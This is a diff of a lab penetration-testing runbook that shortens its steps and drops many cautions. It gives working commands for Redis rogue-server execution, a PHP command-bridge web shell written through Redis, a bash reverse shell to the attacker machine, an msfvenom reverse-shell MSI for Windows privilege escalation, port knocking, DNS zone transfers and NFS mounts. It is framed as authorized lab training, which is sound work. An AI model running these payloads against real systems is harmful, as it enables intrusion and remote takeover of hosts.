-| Existing replica, production/shared data, missing reset route or unexplained module state | Do not use this route; **NET-05** or **PAUSE-RECOVERY**. Rogue synchronization can replace data. |
-| Command absent/renamed/denied or version does not match | **NET-05** for another lead. Do not force-enable the command. |
-| Callback route or architecture remains unknown | Resolve that exact fact before an attempt; do not launch the tool. |
+| All prerequisites observed and baseline recorded | **REXP-02**. |
+| Existing replica, missing reset or unexplained module state | **PAUSE-RECOVERY**. |
+| Command absent or version mismatch | **NET-05**. |
 
 ## REXP-02. Can one reviewed rogue-server attempt establish Redis OS execution?
 
-Run from the reviewed local tool directory on Kali. Confirm the installed
-interface and callback route:
-
 ```bash
 python3 ./redis-rogue-server.py --help
-ip route get '<TARGET_IP>'
+python3 ./redis-rogue-server.py --rhost '<TARGET_IP>' --rport '<PORT>' --lhost '<KALI_IP>' --lport '<ROGUE_PORT>'
 ```
 
-For an endpoint that does not require authentication:
-
-```bash
-python3 ./redis-rogue-server.py --rhost '<TARGET_IP>' --rport '<OBSERVED_PORT>' --lhost '<KALI_IP>' --lport '<ROGUE_PORT>'
-```
-
-If a verified Redis password is required, the upstream tool accepts it only as
-a process argument:
-
-```bash
-python3 ./redis-rogue-server.py --rhost '<TARGET_IP>' --rport '<OBSERVED_PORT>' --lhost '<KALI_IP>' --lport '<ROGUE_PORT>' --passwd '<VERIFIED_REDIS_PASSWORD>'
-```
-
-The authenticated form exposes the password in the Kali process list. Use it
-only in the single-user lab VM, close the process after the attempt and do not
-save the command in shared notes.
-
-At the tool's `[<<]` prompt, request only identity and host context first:
+Add `--passwd '<PASSWORD>'` only when the verified Redis password is required. At the `[<<]` prompt:
 
 ```text
 id
-```
-
-```text
 hostname
-```
-
-```text
 pwd
 ```
 
-Do not type `exit` yet if **REXP-04** is needed; leaving the prompt starts the
-tool's cleanup.
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Attributable Redis-account output on the assigned host | **REXP-03** to verify live module/state. If the exact web pivot prerequisites already exist, complete **REXP-04** before leaving the tool prompt. |
-| Tool reports module load but identity output is missing | **REXP-03**. Do not infer execution from the tool status line. |
-| Replication/module/configuration error | **REXP-03** for actual post-state and recovery. Do not rerun unchanged. |
-| Target instability or unknown data/state change | **PAUSE-RECOVERY** and use the lab reset route. |
+| Attributable output on the assigned host | **REXP-03**. |
+| Module load, no identity output | **REXP-03**; status text is not proof. |
+| Replication or module error | **REXP-03** for the actual state. |
 
 ## REXP-03. What state did the rogue-server attempt leave behind?
 
-While the tool prompt is still open, use a second authenticated `redis-cli`
-session and inspect:
+From a second client:
 
 ```text
 COMMAND INFO system.exec
-```
-
-```text
 MODULE LIST
-```
-
-```text
 INFO replication
-```
-
-```text
 CONFIG GET dbfilename
 ```
 
-After any selected **REXP-04** pivot and its cleanup, type `exit` at the tool
-prompt. Reconnect with `redis-cli` and repeat the four checks above.
-
-| Result | Next choice |
-| --- | --- |
-| `system` module absent, role restored to `master` and original `dbfilename` restored | Keep the before/after state. A separately obtained usable shell goes to **EXP-03**, then **LNX-01**. |
-| Module, `exp.so`, changed filename or replication state remains | Use the exact recovery below only when it matches the recorded baseline. Otherwise **PAUSE-RECOVERY** or reset the lab. |
-| Redis dataset/application behavior changed | Reset or revert the disposable lab. Module cleanup does not restore a replaced dataset. |
-
-For the known initial-master baseline only, while `system.exec` still exists:
+Restore the baseline while `system.exec` exists:
 
 ```text
-system.exec "rm -- '<ORIGINAL_REDIS_DIR>/exp.so'"
-```
-
-Then restore the exact recorded filename, unload the observed module name and
-return to standalone master state:
-
-```text
+system.exec "rm -- '<ORIGINAL_DIR>/exp.so'"
 CONFIG SET dbfilename '<ORIGINAL_DBFILENAME>'
-```
-
-```text
 MODULE UNLOAD system
-```
-
-```text
 REPLICAOF NO ONE
 ```
 
-Repeat the four post-state checks. A mismatch goes to **PAUSE-RECOVERY** or the
-lab reset route, not another exploitation attempt.
+Then repeat the checks. Any mismatch goes to **PAUSE-RECOVERY** or lab reset.
 
 ## REXP-04. Can a verified PHP include execute one Redis-written RDB as the web user?
 
-Use this only while `system.exec` remains available and every prerequisite is
-observed:
-
-- **WREAD-01** proved the exact file parameter and endpoint;
-- source or behavior proves PHP `include`/`require`, not a read-only file response;
-- Redis can write one exact directory reachable by that PHP process;
-- original `dir`, `dbfilename` and `rdbcompression` values are recorded;
-- the generated key, filename and command parameter are new for this run.
-
-At the second Redis prompt, record the three settings, then create one RDB with
-a uniquely named PHP command bridge:
+Use only while `system.exec` works and WREAD-01 proved an actual PHP `include`.
 
 ```text
 CONFIG GET dir
-```
-
-```text
 CONFIG GET dbfilename
-```
-
-```text
 CONFIG GET rdbcompression
-```
-
-```text
-SET owb_php_<RUN_ID> '<?php echo "OWB_USER:"; system($_GET["owb_cmd"]); ?>'
-```
-
-```text
-CONFIG SET dir '<OBSERVED_REDIS_WRITABLE_DIRECTORY>'
-```
-
-```text
-CONFIG SET dbfilename 'owb-user-<RUN_ID>.rdb'
-```
-
-```text
+SET owb_php_<ID> '<?php echo "OWB_USER:"; system($_GET["owb_cmd"]); ?>'
+CONFIG SET dir '<WEB_WRITABLE_DIR>'
+CONFIG SET dbfilename 'owb-user-<ID>.rdb'
 CONFIG SET rdbcompression no
-```
-
-```text
 SAVE
 ```
 
-From Kali, request the verified include with an identity command:
-
 ```bash
-curl -sS --get 'http://<TARGET>/<VERIFIED_LFI_ENDPOINT>' --data-urlencode '<VERIFIED_FILE_PARAMETER>=<OBSERVED_REDIS_WRITABLE_DIRECTORY>/owb-user-<RUN_ID>.rdb' --data-urlencode 'owb_cmd=id'
+curl -sS --get 'http://<TARGET>/<LFI_ENDPOINT>' --data-urlencode '<FILE_PARAM>=<WEB_WRITABLE_DIR>/owb-user-<ID>.rdb' --data-urlencode 'owb_cmd=id'
 ```
 
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Response contains `OWB_USER:` followed by attributable web-worker identity | Command execution as that account is proved. If a shell is needed, use the listener request below once, then **SHELL-01/EXP-03/LNX-01**. |
-| RDB bytes appear but no attributable command output | Inclusion/handler execution is not proved; restore below, then return to **WREAD-01**. |
-| `SAVE` or write fails | Restore any changed settings below, then **LNX-04** only from an independently verified host shell. Do not guess directories. |
-| Different user/host or unstable response | Restore below and use **PAUSE-RECOVERY**. |
+| `OWB_USER:` plus web identity | **[SHELL-01](./shell-01)/[EXP-03](./exp-03)** if a shell is needed, then **LNX-01**. |
+| RDB bytes, no output | Restore, return to **WREAD-01**. |
+| `SAVE` fails | Restore, then **LNX-04** from a shell. |
 
-For one authorized shell request, start the listener on Kali:
-
-```bash
-rlwrap nc -lvnp '<WEB_SHELL_PORT>'
-```
-
-In another Kali terminal, trigger the same verified include:
-
-```bash
-curl -sS --get 'http://<TARGET>/<VERIFIED_LFI_ENDPOINT>' --data-urlencode '<VERIFIED_FILE_PARAMETER>=<OBSERVED_REDIS_WRITABLE_DIRECTORY>/owb-user-<RUN_ID>.rdb' --data-urlencode "owb_cmd=bash -c 'bash -i >& /dev/tcp/<KALI_IP>/<WEB_SHELL_PORT> 0>&1'"
-```
-
-Verify the received channel through **SHELL-01/EXP-03**. Before leaving the
-rogue-server prompt, restore Redis and remove the exact generated artifacts:
-
-```text
-CONFIG SET dir '<ORIGINAL_REDIS_DIR>'
-```
-
-```text
-CONFIG SET dbfilename '<ORIGINAL_DBFILENAME>'
-```
-
-```text
-CONFIG SET rdbcompression '<ORIGINAL_RDBCOMPRESSION>'
-```
-
-```text
-DEL owb_php_<RUN_ID>
-```
-
-```text
-system.exec "rm -- '<OBSERVED_REDIS_WRITABLE_DIRECTORY>/owb-user-<RUN_ID>.rdb'"
-```
-
-Confirm the three settings and exact file absence, then return to **REXP-03**
-and exit the tool. If any original value or generated path is uncertain, keep
-the tool prompt open and use **PAUSE-RECOVERY** or reset the disposable lab.
+Restore `dir`, `dbfilename` and `rdbcompression`, `DEL owb_php_<ID>`, and remove the `.rdb` through `system.exec`, then return to **REXP-03**.
 
 # ssh_knock
 
 ## SSH-03. Use an observed opening sequence, then close that access
 
-**Use when:** a permitted read at WREAD-01 or LNX-07 supplies the assigned
-host's actual knock configuration. It defines an opening event for the exact
-SSH port and a matching closing event for this client's source address.
-You have permission to change that firewall access and a tested recovery
-route if closing fails. Closed SSH alone is not a knock lead.
+Enter when a read at WREAD-01 or LNX-07 supplied the host's actual knock sequence and you may change its firewall.
 
-Read the complete two event blocks. Record their ordered ports and protocols,
-`seq_timeout`, TCP flags, firewall action, SSH port and source-IP substitution.
-Use this step only for fixed sequences compatible with ordinary TCP SYN knocks
-and an opening/closing pair that adds/removes the same scoped access. Unknown
-actions, one-time sequences, other TCP flags, IPv6 or timed-only closure need
-their own reviewed procedure at PAUSE-COVERAGE. Do not edit the daemon configuration.
+Record both event blocks: ordered ports and protocols, `seq_timeout`, flags, action and the opening/closing pair for the exact SSH port. Unknown flags or one-time sequences go to **PAUSE-COVERAGE**.
 
-1. On the **same Kali client** used for SSH, check the route and exact port's
-   baseline. Reuse a still-current NET-03 baseline if it already answers this.
+Check the baseline from the same client:
 
 ```bash
-ip route get '<authorized-target-ipv4>'
+ip route get '<TARGET_IP>'
+nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
 ```
 
-```bash
-nmap -n -Pn -sT -p '<observed-ssh-port>' --max-retries 1 --host-timeout 15s '<authorized-target-ipv4>'
-```
-
-   Keep the selected route/source address. If SSH is already open, do not add
-   another firewall rule. Go to SSH-01 if login is permitted. A failed/incomplete
-   scan is an unknown baseline, not a reason to knock. NAT may translate `src`;
-   keep the same client/route throughout and do not assume that local address is
-   the server's `%IP%` value. Stop on an unexplained route change.
-
-2. For a closed/filtered baseline, send **one** observed opening sequence.
-   Replace every port and `tcp`/`udp` with that event's actual values. The example
-   shows three hits; add/remove arguments to match its exact length. Choose a
-   positive millisecond delay whose total sequence fits the observed timeout,
-   allowing for network latency. Do not change the order or guess extra ports.
+If already open, go to **SSH-01** without knocking. Otherwise send the opening sequence once:
 
 ```bash
-knock -4 -v -d '<delay-ms-within-observed-sequence-timeout>' '<authorized-target-ipv4>' '<first-opening-port>:tcp' '<second-opening-port>:tcp' '<third-opening-port>:tcp'
-```
-
-```bash
-nmap -n -Pn -sT -p '<observed-ssh-port>' --max-retries 1 --host-timeout 15s '<authorized-target-ipv4>'
+knock -4 -v -d '<DELAY_MS>' '<TARGET_IP>' '<PORT1>:tcp' '<PORT2>:tcp' '<PORT3>:tcp'
+nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
 ```
 
 | Result | Next |
 | --- | --- |
-| The exact port changes to open from this client | SSH-01 for verified host trust, then SSH-02 for one permitted login and native host/identity. Record the access change and its closing sequence before login. Open TCP is not authentication proof. |
-| Port remains closed/filtered, the client errors, or the scan is incomplete | Do not repeat the opening sequence. Attempt the known closing sequence below once because the action may have run despite the failed observation. Retain the uncertain result; then PAUSE-COVERAGE for one missing fact. |
-| Route/source changes or the target is no longer attributable | Pause for the tested recovery route. Do not send a closing sequence from a different client or claim restoration. |
+| Port opens | **SSH-01**, then **SSH-02**. |
+| Still closed or scan incomplete | Send the closing sequence once, then **PAUSE-COVERAGE**. |
+| Route changed | **PAUSE-RECOVERY**. |
 
-3. After the selected SSH work, exit **your** remote shells and close your SSH
-   forwards before closing access. Do not kill someone else's sessions. Back on
-   the same Kali client, check the route again, then send the actual closing
-   event's sequence **once**. It is not necessarily the opening sequence reversed.
+After SSH work, exit your shells, recheck the route and send the actual closing sequence once. Verify the port is filtered again.
 
-```bash
-ip route get '<authorized-target-ipv4>'
-```
-
-```bash
-knock -4 -v -d '<delay-ms-within-observed-closing-timeout>' '<authorized-target-ipv4>' '<first-closing-port>:tcp' '<second-closing-port>:tcp' '<third-closing-port>:tcp'
-```
-
-```bash
-nmap -n -Pn -sT -p '<observed-ssh-port>' --max-retries 1 --host-timeout 15s '<authorized-target-ipv4>'
-```
-
-| Closing result | Next |
+| Result | Next |
 | --- | --- |
-| A fresh connection probe returns to the recorded closed/filtered baseline | Record restored reachability from this client at the source step's cleanup. Exact firewall-rule removal requires separately attributed rule/log evidence; do not claim it from Nmap alone. Continue the assigned workflow without automatically reopening SSH. |
-| Port remains open, output is incomplete, or baseline/source cannot be matched | the source step's cleanup records unresolved firewall cleanup. Use the prearranged recovery route; do not repeatedly knock, flush firewall rules or automatically reconnect. |
-
-Keep opening/closing times, exact event context and bounded port observations in
-local adventure evidence. Preserve daemon logs/history. No target file is
-created by these client commands, but firewall state may change even when a
-probe fails. Do not declare cleanup merely because the SSH shell exited.
+| Port returns to the closed baseline | Continue the workflow. |
+| Port open or baseline unconfirmed | **PAUSE-RECOVERY**. |
 
 # windows_privilege
 
-Run only on an assigned disposable Windows lab with a recorded reset/revert
-method. WIN-01 must establish host and architecture; WIN-07 must confirm both
-policy hives are 1 for the current user. Do not enable either policy yourself.
-Use your locally reviewed msfvenom build and MSI template, Python 3 and Ncat.
-This changes the target and opens one unauthenticated callback. Do not use it
-when package behavior, authorization or recovery is unknown.
+Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 both policy hives.
 
 ## WPRIV-01. Does the enabled installer policy yield the intended Windows token?
 
-In Kali Bash, choose a new directory and matching unused callback/transfer ports.
-Stop if directory creation fails. This example is for a verified x64 host;
-verified x86 uses `windows/shell_reverse_tcp`, not the x64 payload:
-
 ```bash
-mkdir -m 700 -- './win-msi-<unique-run-id>'
-```
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp \
-  LHOST='<owned-Kali-lab-interface-ipv4>' LPORT='<unused-callback-port>' \
-  -f msi -o './win-msi-<same-run-id>/proof.msi'
-```
-
-```bash
-sha256sum -- './win-msi-<same-run-id>/proof.msi'
-```
-
-Retain the build/template review and MSI hash privately. Generation is not
-execution. In this Kali terminal, serve only that new directory, not the app or
-evidence directory:
-
-```bash
-python3 -m http.server '<unused-transfer-port>' --bind '<same-owned-Kali-lab-interface-ipv4>' --directory './win-msi-<same-run-id>'
-```
-
-In the existing verified Windows PowerShell, create a new destination. Stop if
-it exists or any command fails. Use a simple run ID with letters/digits/hyphens:
-
-```powershell
-New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi-<unique-run-id>' -ErrorAction Stop
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<LHOST>' LPORT='<LPORT>' -f msi -o proof.msi
+sha256sum proof.msi
+python3 -m http.server '<HTTP_PORT>' --bind '<LHOST>'
 ```
 
 ```powershell
-Invoke-WebRequest -UseBasicParsing -TimeoutSec 30 -Uri 'http://<same-owned-Kali-lab-interface-ipv4>:<same-transfer-port>/proof.msi' -OutFile 'C:\Users\Public\owb-msi-<same-run-id>\proof.msi'
-if ((Get-FileHash -Algorithm SHA256 -LiteralPath 'C:\Users\Public\owb-msi-<same-run-id>\proof.msi').Hash -ne '<recorded-Kali-MSI-sha256>') { throw 'Transfer hash mismatch; do not install' }
+New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi' -ErrorAction Stop
+Invoke-WebRequest -Uri 'http://<LHOST>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
+(Get-FileHash -LiteralPath 'C:\Users\Public\owb-msi\proof.msi' -Algorithm SHA256).Hash
 ```
 
-Stop the foreground HTTP server with Ctrl-C after hash confirmation. In a
-separate Kali terminal start the one-connection listener on the owned interface:
-
-```bash
-ncat --listen '<same-owned-Kali-lab-interface-ipv4>' '<same-callback-port>'
-```
-
-Back in the original Windows PowerShell, recheck both current-user policy hives
-through WIN-07, then select this one installation attempt:
+Start `ncat --listen '<LHOST>' '<LPORT>'` in a second terminal, then install:
 
 ```powershell
-(Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', 'C:\Users\Public\owb-msi-<same-run-id>\proof.msi', '/qn', '/norestart', '/L*v', 'C:\Users\Public\owb-msi-<same-run-id>\install.log') -Wait -PassThru -WindowStyle Hidden).ExitCode
+msiexec.exe /i 'C:\Users\Public\owb-msi\proof.msi' /qn /norestart
 ```
 
-Inspect the attributable callback at the Kali listener. It is Windows **cmd**,
-not Kali Bash or PowerShell:
+In the callback: `hostname; whoami /all`.
 
-```cmd
-hostname
-whoami /all
-```
-
-| Observation | Next choice |
+| Result | Next |
 | --- | --- |
-| Correct assigned host and intended higher-privilege token | WIN-01 for this new process; read the exact objective if applicable, then close the listener and use the preselected lab reset. A callback alone is not objective completion. |
-| Callback has the original/restricted identity | Preserve the actual token; PAUSE-COVERAGE for policy/user/template context. No elevation claim. |
-| No callback, installer error or stalled installation | Retain the exact log/exit result; PAUSE-COVERAGE for transfer, architecture, route and package behavior. No automatic retry and no disabling defenses. |
-| Callback host/identity cannot be attributed | EXP-03. Do not use the channel for host work yet. |
-| Unexpected installed state, health issue or unresolved child process | PAUSE-RECOVERY using the recorded disposable-lab recovery method. |
+| Assigned host and higher token | **WIN-01**. |
+| Original token | **PAUSE-COVERAGE**. |
+| No callback or installer error | **PAUSE-COVERAGE**. |
+| Unexpected installed state | **PAUSE-RECOVERY**. |
 
-When finished, type `exit` in this
-callback cmd. Confirm Ncat ends; interrupt only that foreground listener if it
-remains. Confirm the earlier HTTP server is stopped. Retain the MSI hash and
-installer log in protected evidence before removing their exact temporary files.
-From the original Windows PowerShell:
-
-```powershell
-Get-Content -LiteralPath 'C:\Users\Public\owb-msi-<same-run-id>\install.log' -Tail 80
-Remove-Item -LiteralPath 'C:\Users\Public\owb-msi-<same-run-id>\proof.msi', 'C:\Users\Public\owb-msi-<same-run-id>\install.log' -ErrorAction Stop
-if (@(Get-ChildItem -LiteralPath 'C:\Users\Public\owb-msi-<same-run-id>' -Force -ErrorAction Stop).Count -ne 0) { throw 'Unexpected files remain; retain directory and inspect' }
-Remove-Item -LiteralPath 'C:\Users\Public\owb-msi-<same-run-id>' -ErrorAction Stop
-```
-
-If the directory is not empty, stop and inspect. Never confirm recursive removal
-or delete other MSI/temp files. On Kali, after evidence custody:
-
-```bash
-rm -i -- './win-msi-<same-run-id>/proof.msi'
-rmdir -- './win-msi-<same-run-id>'
-```
-
-The reviewed MSI can extract an executable or leave installer state beyond these
-named files. A nonzero exit or absent registration does not prove restoration.
-Record the assigned lab reset/revert at the source step's cleanup after the exercise, before clean
-closure. If recovery is unavailable or cannot be confirmed, PAUSE-RECOVERY. Do
-not run `/x` against an armed MSI as a guessed cleanup method, or delete Windows
-Installer caches. No policy value or user/account is modified by this procedure.
+Cleanup: read the install log, remove the MSI and log, remove the directory, and delete the local MSI.
 
 # dns_nfs
 
-Run commands in **Kali Bash**, including the Workbench Kali shell. Replace every
-`<...>` value before running its block. Run only the block matching your result,
-not all alternatives. Keep output and sensitive findings in your local adventure.
-An address or name returned by a service does not extend authorized scope.
+Replace every `<...>` value before running its command.
 
 ## DNS-01 — Can the assigned resolver answer the observed name?
 
-Enter with an observed DNS endpoint, its actual port and an in-scope hostname.
-Replace the same values in each matching command. Do not assume port 53 when
-service identification found another assigned port:
+Enter with the observed DNS port and an in-scope name.
 
 ```bash
-dig '@<authorized-resolver-ip>' -p '<observed-dns-port>' -q '<observed-hostname>' -t A +timeout=3 +tries=1
+dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<HOSTNAME>' -t A +timeout=3 +tries=1
 ```
 
-Look at `status`, `ANSWER SECTION`, and `SERVER`, not only the exit code.
+Retry with `+tcp` once if the reply is truncated. `NXDOMAIN` is an answer; `REFUSED`/`SERVFAIL` is not. A reverse lookup can suggest a name, not prove one:
 
-| Result | Next action |
+```bash
+dig '@<DNS_IP>' -p '<DNS_PORT>' -x '<TARGET_IP>' +timeout=3 +tries=1
+```
+
+| Result | Next |
 | --- | --- |
-| `NOERROR` with an A answer | Record the exact name/address and resolver; go to **DNS-02**. |
-| CNAME only | Record the alias. Query the returned canonical name using this block only if it is in scope; otherwise keep it as an uncontacted clue and go to **NET-05**. |
-| `NOERROR`, no A answer | If this service needs IPv6, run the separate AAAA command below; otherwise preserve the empty A result and choose another observed lead at **NET-05**. |
-| `NXDOMAIN` | Check the observed spelling and resolver assignment once. If unchanged, record this resolver's negative answer and return to **NET-05**. |
-| `REFUSED` or `SERVFAIL` | Record the DNS response, not “host absent.” Confirm the resolver/zone assignment; use an explicitly supplied alternate resolver or pause at **PAUSE-ROUTE**. |
-| Timeout or truncated/incomplete response | Run the TCP retry below. A TCP answer follows the same rows; another timeout goes to the route check below. |
-| Name or resolver outside scope | Do not query it; choose an authorized lead at **NET-05**. |
-
-TCP retry, against the same endpoint:
-
-```bash
-dig '@<authorized-resolver-ip>' -p '<observed-dns-port>' -q '<observed-hostname>' -t A +tcp +timeout=3 +tries=1
-```
-
-Only when an IPv6 answer would change the next action, ask the same resolver
-for AAAA:
-
-```bash
-dig '@<authorized-resolver-ip>' -p '<observed-dns-port>' -q '<observed-hostname>' -t AAAA +timeout=3 +tries=1
-```
-
-If that AAAA reply is truncated or incomplete, use TCP on the same endpoint:
-
-```bash
-dig '@<authorized-resolver-ip>' -p '<observed-dns-port>' -q '<observed-hostname>' -t AAAA +tcp +timeout=3 +tries=1
-```
-
-After repeated transport failure:
-
-```bash
-ip route get '<authorized-resolver-ip>'
-```
-
-Missing/wrong VPN route: **PAUSE-ROUTE**, restore the assigned lab connection,
-then repeat DNS-01. Correct route but no DNS response: retain transport uncertainty
-and return to **NET-03** for the observed endpoint; do not repeatedly probe it.
-
-No hostname yet, but an authorized target address is known? One reverse lookup
-can supply a candidate; it is not a substitute for validating the name:
-
-```bash
-dig '@<authorized-resolver-ip>' -p '<observed-dns-port>' -x '<authorized-target-ip>' +timeout=3 +tries=1
-```
-
-PTR answer: check scope, replace the observed hostname with that name in DNS-01.
-No PTR answer:
-return to **NET-05** using the observed IP services.
+| A record returned | **DNS-02** with that name. |
+| CNAME only | Query the canonical name if in scope; otherwise **NET-05**. |
+| NXDOMAIN | **NET-05**. |
+| REFUSED, SERVFAIL or timeout | **NET-03**, or **PAUSE-ROUTE** for a route problem. |
 
 ## DNS-02 — Does this name belong to the service you intend to inspect?
 
-Enter with DNS-01's answer and a known service endpoint. Compare the answer with
-your assigned target before making contact. This block is for an observed HTTP(S)
-service; it does not discover an unobserved web port.
-
 ```bash
-curl -q --noproxy '*' --connect-timeout 5 \
-  --resolve '<observed-hostname>:<observed-web-port>:<authorized-target-ip>' \
-  -i '<http-or-https>://<observed-hostname>:<observed-web-port>/'
+curl -q --noproxy '*' --connect-timeout 5 --resolve '<HOSTNAME>:<PORT>:<TARGET_IP>' -i '<SCHEME>://<HOSTNAME>:<PORT>/'
 ```
 
-| Result/context | Next action |
+Keep certificate validation. Add `--cacert '<LAB_CA>'` only when a lab CA was supplied.
+
+| Result | Next |
 | --- | --- |
-| Attributable HTTP response, including 401/403/404 | Record scheme, hostname, port and path as this application base; **WEB-01**. An error status still proves an HTTP response, not useful access. |
-| Redirect names another host | Record `Location`; do not follow automatically. In-scope named endpoint: **DNS-01** for that name. Otherwise **NET-05**. |
-| Certificate failure | Keep verification enabled; confirm hostname, HTTPS scheme and supplied lab CA. With an assigned CA, run the full HTTPS retry below; unresolved trust goes to **PAUSE-ROUTE**. |
-| Connection failure | Check the observed port/scheme at **NET-03**; naming did not prove service reachability. |
-| DNS answer conflicts with assignment | **PAUSE-ROUTE**; clarify the endpoint rather than contacting the returned address. |
-| Observed SMB/LDAP/Kerberos domain context | **AD-01** for its existing identity commands; a DNS suffix alone is insufficient. |
-| Other service or unconfirmed relationship | **NET-05**, with the name recorded as a qualified clue. |
-
-Only after the assigned CA and HTTPS hostname are confirmed, repeat this exact
-origin check with that CA. Do not use this retry for plain HTTP or a changed
-hostname, address or port:
-
-```bash
-curl -q --noproxy '*' --connect-timeout 5 \
-  --cacert '<absolute-path-to-assigned-lab-ca-file>' \
-  --resolve '<observed-hostname>:<observed-web-port>:<authorized-target-ip>' \
-  -i 'https://<observed-hostname>:<observed-web-port>/'
-```
+| Attributable HTTP response | **WEB-01** at this origin. |
+| Redirect to another in-scope name | **DNS-01** for that name. |
+| Certificate failure | **PAUSE-ROUTE**. |
+| Connection failure | **NET-03**. |
+| Domain service context | **AD-01**. |
 
 ## DNS-03 — Is one assigned zone authoritative and explicitly transferable?
 
-Enter only with an observed authoritative DNS server and port, one assigned zone name and
-explicit authorization to test a zone transfer. This is not a wordlist or
-subdomain brute-force procedure. Keep the resolver, zone and returned names in
-private adventure data and do not query names that are outside the assignment.
-
 ```bash
-dig '@<authorized-authoritative-server>' -p '<observed-authoritative-dns-port>' -q '<assigned-zone-with-trailing-dot>' SOA +noall +answer +authority +comments
+dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<ZONE>.' SOA +noall +answer +authority
+timeout 20s dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<ZONE>.' AXFR +noall +answer
 ```
 
-If the exercise explicitly authorizes AXFR for this exact zone and server, run
-one bounded attempt:
+Only run AXFR when the zone transfer is authorized.
 
-```bash
-timeout 20s dig '@<authorized-authoritative-server>' -p '<observed-authoritative-dns-port>' -q '<assigned-zone-with-trailing-dot>' AXFR +noall +answer
-printf 'AXFR exit status: %s\n' "$?"
-```
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| SOA identifies the assigned zone | Record authority and serial; **NET-05** or **DNS-02** for one observed in-scope service name. |
-| AXFR returns records under explicit authorization | Record zone, server, serial and returned extent privately; do not recursively contact every name. Choose one assigned/observed name through **DNS-01**. |
-| AXFR refused, timed out or is not authorized | Preserve the refusal/timeout and return to **NET-05**; do not retry against other names or servers. |
-| Authority differs from assignment | **PAUSE-ROUTE**; clarify the zone/server relationship before using any returned name. |
-| Partial/truncated transfer | Preserve the serial and incomplete extent; **PAUSE-COVERAGE** rather than calling the zone complete. |
-
-Do not run a wordlist, `dnsrecon`, `dnsenum`, wildcard sweep or DNS update from
-this decision. A returned name is a clue, not automatic scope expansion.
+| SOA confirms the zone | **DNS-02** or **NET-05**. |
+| AXFR returns records | Pick one name through **DNS-01**. |
+| Refused or timed out | **NET-05**. |
+| Partial transfer | **PAUSE-COVERAGE**. |
 
 ## NFS-01 — What export and client context are actually available?
 
-Enter with observed RPC/NFS on an authorized **IPv4** target. This uses the
-normal MOUNT discovery path; custom RPC ports need a separately specified
-procedure, not a guessed default.
-
 ```bash
-timeout 15s showmount -e '<authorized-target-ipv4>'
+timeout 15s showmount -e '<TARGET_IP>'
 ```
 
-Run `rpcinfo` only if the export listing fails or the NFS version/port needed
-for NFS-02 is still unknown:
+Use `rpcinfo -p '<TARGET_IP>'` only if the listing fails and you still need the version or port.
 
-```bash
-timeout 15s rpcinfo -p '<authorized-target-ipv4>'
-```
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Export path listed; your actual client is permitted | Record path and restrictions. If version/port is known, **NFS-02**; otherwise use the conditional RPC inventory above. Listing is not yet a read test. |
-| Client/network restriction excludes your client | **NET-05**; retain the restriction. Do not spoof an allowed address or identity. |
-| Empty/failed `showmount`, but NFSv4 and an authorized v4 path are supplied | **NFS-02** using that exact v4 path/version. Do not substitute the v3 path automatically. |
-| NFS response but no export path available | **GAP-SERVICE**: record “export path unknown”; use another observed lead at **NET-05**. No-export-list does not mean no NFS. |
-| RPC error/timeout | **NET-03** for protocol/port confirmation; do not conclude NFS is absent. |
-| Local command missing | Check `command -v rpcinfo showmount mount.nfs`; install the lab's approved `nfs-common` package through your normal Kali setup, then repeat. |
+| Export listed and your client permitted | **NFS-02**. |
+| Client excluded | **NET-05**. |
+| NFSv4 with a supplied path | **NFS-02** with that version. |
+| No export list | **GAP-SERVICE**. |
+| RPC error | **NET-03**. |
 
 ## NFS-02 — Can your permitted identity read one relevant file?
 
-Enter with one authorized export, version and client context. This is a temporary
-**read-only** inspection, not a write/root-squash test. Use an unused mountpoint;
-do not reuse a concurrently mounted export. Replace the version with `3` or the
-observed/supplied v4 version, such as `4.1`.
-
-Choose a fresh mountpoint name and repeat it in each step. Stop if `mkdir`
-reports that it exists:
-
 ```bash
-mkdir -m 700 -- '/tmp/owb-nfs-<unique-run-id>'
+mkdir -m 700 -- '/tmp/owb-nfs'
+sudo mount -t nfs -o 'ro,nosuid,nodev,noexec,vers=<VERSION>,proto=tcp,port=<PORT>' '<TARGET_IP>:<EXPORT>' '/tmp/owb-nfs'
+findmnt --mountpoint '/tmp/owb-nfs' -o SOURCE,OPTIONS
+ls -lan -- '/tmp/owb-nfs'
+stat -- '/tmp/owb-nfs/<FILE>'
+head -c 4096 -- '/tmp/owb-nfs/<FILE>'
 ```
 
-Mount the exact export read-only:
+Cleanup after the read:
 
 ```bash
-sudo mount -t nfs -o 'ro,nosuid,nodev,noexec,fg,retry=0,vers=<observed-version>,proto=tcp,port=<observed-nfs-port>' '<authorized-target-ipv4>:<exact-export-path>' '/tmp/owb-nfs-<same-run-id>'
+sudo umount -- '/tmp/owb-nfs' && rmdir -- '/tmp/owb-nfs'
 ```
 
-Run inspection only if the mount succeeded and `findmnt` shows **this exact source
-and mountpoint with `ro`**. A failed mount's empty local directory is not the export.
-
-```bash
-findmnt --mountpoint '/tmp/owb-nfs-<same-run-id>' -o TARGET,SOURCE,FSTYPE,OPTIONS
-id
-ls -lan -- '/tmp/owb-nfs-<same-run-id>'
-```
-
-Choose one relevant regular file at the export root, not a symlink, directory or
-device. Replace its **basename only** (no `/`, `..` or symlink components):
-
-```bash
-stat -- '/tmp/owb-nfs-<same-run-id>/<one-relevant-file-basename>'
-head -c 4096 -- '/tmp/owb-nfs-<same-run-id>/<one-relevant-file-basename>'
-```
-
-| Result | Next action, after cleanup below |
+| Result | Next |
 | --- | --- |
-| Relevant file readable | Record path, inspected byte limit, current identity and the specific clue; **NET-05** for its matching observed service. Credentials are a finding, not permission to try every account/service. |
